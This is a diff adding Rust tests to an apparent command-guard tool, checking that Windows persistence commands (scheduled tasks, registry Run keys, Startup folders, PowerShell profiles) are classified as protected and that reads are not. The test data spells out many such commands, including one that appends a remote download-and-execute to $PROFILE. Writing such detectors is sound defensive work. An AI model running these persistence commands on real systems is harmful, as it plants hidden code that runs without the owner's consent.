@@ -5107,6 +5107,184 @@ fn issue_1269_git_config_attached_values_are_not_editor_options() {
     }
 }
 
+/// #1261 (D168): Windows places and commands that run code later (scheduled
+/// tasks, registry Run keys, the Startup folders, PowerShell profiles) are
+/// persistence on Windows, as cron, launchd and shell start-up files are
+/// elsewhere. Runs on every platform.
+#[test]
+fn issue_1261_windows_persistence_is_protected() {
+    use ProtectedActionKind::Persistence;
+    for line in [
+        r"schtasks /create /tn x /tr C:\work\x.exe /sc onlogon",
+        r"schtasks.exe /Change /TN x /TR C:\work\y.exe",
+        r"C:\Windows\System32\schtasks.exe -create -tn x -tr y -sc daily",
+        r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\work\x.exe",
+        r#"reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v x /d y /f"#,
+        r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v x /d y",
+        r"reg add HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run /v x /d y",
+        r"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /f",
+        "reg import settings.reg",
+        r"reg.exe restore HKCU\Software saved.hiv",
+        "regedit /s settings.reg",
+        r#"copy x.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\x.bat""#,
+        r#"copy x.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\x.lnk""#,
+        r"echo x >> %USERPROFILE%\Documents\WindowsPowerShell\profile.ps1",
+        r"copy task.xml C:\Windows\System32\Tasks\x",
+    ] {
+        assert_eq!(cmd(line), Some(Persistence), "cmd /c {line}");
+    }
+    for line in [
+        "Register-ScheduledTask -TaskName x -Action $a -Trigger $t",
+        "Set-ScheduledTask -TaskName x -Action $a",
+        "Register-ScheduledJob -Name x -ScriptBlock { iwr x }",
+        "$s = New-Object -ComObject Schedule.Service",
+        r"Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name x -Value 'C:\work\x.exe'",
+        r"New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name x -Value y",
+        r"New-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run -Name x -Value y",
+        r"Set-Location HKCU:\Software\Microsoft\Windows\CurrentVersion\Run; New-ItemProperty -Path . -Name x -Value y",
+        r"& reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d y",
+        "Add-Content $PROFILE 'iex (iwr https://x.example)'",
+        "'x' | Out-File -Append $profile.CurrentUserAllHosts",
+        "New-Item -ItemType File -Force -Path $PROFILE",
+        r#"Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\x.cmd" 'x'"#,
+        r#"Copy-Item x.ps1 "$HOME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1""#,
+        r#"Copy-Item -Recurse m "$HOME\OneDrive\Documents\WindowsPowerShell\Modules\m""#,
+        r#"Copy-Item -Recurse m "$HOME\OneDrive - Contoso\Documents\PowerShell\Modules\m""#,
+        r"Remove-Item -Recurse $HOME\Documents\WindowsPowerShell",
+        r"Copy-Item x.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1",
+        r"Copy-Item x.ps1 'C:\Program Files\PowerShell\7\Microsoft.PowerShell_profile.ps1'",
+        // Review 1: launchers before the command, wildcard key names, the
+        // places' variables.
+        r"cmd /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\x.exe",
+        r#"pwsh -c "Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name x -Value y""#,
+        r"Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\R* -Name x -Value y",
+        "Enable-ScheduledTask -TaskName x",
+        r"Copy-Item p.ps1 $PSHOME\profile.ps1",
+        r#"Copy-Item x.lnk "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk""#,
+    ] {
+        assert_eq!(powershell(line), Some(Persistence), "{line}");
+    }
+    for line in [
+        r#"cmd /c "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d y""#,
+        r#"copy x.lnk "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk""#,
+        r#"copy x.lnk "%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk""#,
+        r"copy t.xml %windir%\System32\Tasks\x",
+        r"copy t.xml %SystemRoot%\System32\Tasks\x",
+        r#"copy p.ps1 "%ProgramFiles%\PowerShell\7\profile.ps1""#,
+    ] {
+        assert_eq!(cmd(line), Some(Persistence), "cmd /c {line}");
+    }
+    // Review 2: anywhere in the command, past subexpressions and options.
+    for line in [
+        r"Write-Output (New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name x -Value C:\x.exe)",
+        r"echo $(reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\x.exe /f)",
+        r#"powershell -ExecutionPolicy Bypass -Command "reg import evil.reg""#,
+        "Write-Output (reg import evil.reg)",
+        r"Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVer*\Run -Name x -Value y",
+    ] {
+        assert_eq!(powershell(line), Some(Persistence), "{line}");
+    }
+    for line in [
+        "if exist evil.reg reg import evil.reg",
+        "for %f in (*.reg) do reg import %f",
+        r#"start "Setup" regedit /s evil.reg"#,
+    ] {
+        assert_eq!(cmd(line), Some(Persistence), "cmd /c {line}");
+    }
+    // Review 3: a reader piped into a writer, help around a call, .NET
+    // writers, attached ProgIDs, `.` and `..` in a key.
+    for line in [
+        r"Get-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' | New-ItemProperty -Name x -Value C:\x.exe",
+        r"gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run | ForEach-Object { Set-ItemProperty $_.PSPath -Name x -Value y }",
+        "Get-Help (Register-ScheduledTask -TaskName x -Action $a -Trigger $t)",
+        r"Write-Output ([Microsoft.Win32.Registry]::SetValue('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run','x','y'))",
+        "$s = New-Object -ComObject:Schedule.Service",
+        "$s = New-Object -ComObject Schedule.Service.1",
+        r"Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\.\Run -Name x -Value y",
+        r"Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\x\..\Run -Name x -Value y",
+    ] {
+        assert_eq!(powershell(line), Some(Persistence), "{line}");
+    }
+    // Review 2: a start-up place's variable is plain text in the other
+    // shell, so the line is also judged as if it were (as on main).
+    let in_home = |argv: &[&str]| windows_kind_with(WINDOWS_HOME, WINDOWS_USER_HOME, argv);
+    assert_eq!(
+        in_home(&[
+            "powershell.exe",
+            "-NoProfile",
+            "-Command",
+            r"Add-Content %windir%\..\.bashrc x"
+        ]),
+        Some(Persistence)
+    );
+    assert_eq!(
+        in_home(&[
+            "cmd.exe",
+            "/c",
+            r"echo x >> $PROFILE\..\..\..\..\Users\fixture\.bashrc"
+        ]),
+        Some(Persistence)
+    );
+    assert_eq!(
+        in_home(&["cmd.exe", "/c", r"cd %ProgramData%\.. & echo x > .bashrc"]),
+        Some(Persistence)
+    );
+    // Review 1: cmd has no `%PROFILE%`: climbing out of it stays unknown.
+    assert_eq!(
+        cmd(
+            r#"copy x.bat "%PROFILE%\..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.bat""#
+        ),
+        Some(ProtectedActionKind::UnseenCode)
+    );
+}
+
+/// #1261 (D168): reading those places, and ordinary work near them, is not
+/// persistence.
+#[test]
+fn issue_1261_windows_persistence_reads_are_not_protected() {
+    for line in [
+        "schtasks /query /tn x",
+        r"reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+        r"reg export HKCU\Software\Microsoft\Windows\CurrentVersion\Run run.reg",
+        r"type %USERPROFILE%\Documents\WindowsPowerShell\profile.ps1",
+        r#"dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup""#,
+        r"copy notes.txt %USERPROFILE%\Documents\notes.txt",
+        "echo run the tests",
+    ] {
+        assert_eq!(cmd(line), None, "cmd /c {line}");
+    }
+    for line in [
+        r"Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+        r"Test-Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
+        "Get-ScheduledTask",
+        "Get-Content $PROFILE",
+        "Test-Path $PROFILE",
+        "Write-Output $PROFILE",
+        r"Write-Output 'see CurrentVersion\Run'",
+        r"Set-Content -Path $HOME\Documents\notes.txt -Value x",
+        "cargo run --release",
+        // Review 1.
+        r#"powershell -NoProfile -Command "Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run""#,
+        "node src/FileExplorer/RunButton.js",
+        "cargo test --manifest-path crates/explorer/runtime/Cargo.toml",
+        r"Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Runtime",
+        // Review 2.
+        r"$r = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+        r"powershell -ExecutionPolicy Bypass -c Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+        "cat deploy/schedule.service",
+        r"Remove-Item -Recurse build\chkupdate\*\*",
+        r"Get-ChildItem C:\work\build\*\*",
+    ] {
+        assert_eq!(powershell(line), None, "{line}");
+    }
+    for line in [
+        r#"cmd /c "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run""#,
+        "taskkill /im regedit.exe /f",
+    ] {
+        assert_eq!(cmd(line), None, "cmd /c {line}");
+    }
+}
+
 /// #1283: the word lexer splits quoted text (and unquoted commas), so a
 /// value's text could read as a `git config` option: `--comment 'x --get'`
 /// made a write read as a read, and a quoted `-f` value hid `-e`. git is
